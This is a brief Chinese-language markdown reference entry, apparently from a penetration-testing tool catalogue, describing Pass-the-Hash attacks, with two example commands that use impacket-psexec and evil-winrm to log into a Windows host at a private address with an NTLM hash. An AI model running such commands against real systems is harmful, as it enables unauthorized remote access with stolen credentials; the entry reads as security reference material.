# passing-the-hash

## 简介
Pass-the-Hash 工具集

## 核心参数
无特定参数或使用默认参数

## 命令示例
```bash
# Pass-the-Hash 攻击
# 使用 impacket-psexec
impacket-psexec admin@192.168.1.100 -hashes :ntlm_hash

# 使用 evil-winrm
evil-winrm -i 192.168.1.100 -u admin -H ntlm_hash
```

## 使用场景
提供多种 PTH 攻击方式的工具包

## 所属分类
- [Pass-the-Hash 攻击 (Pass-the-Hash)](../categories/13-pass-the-hash.md)
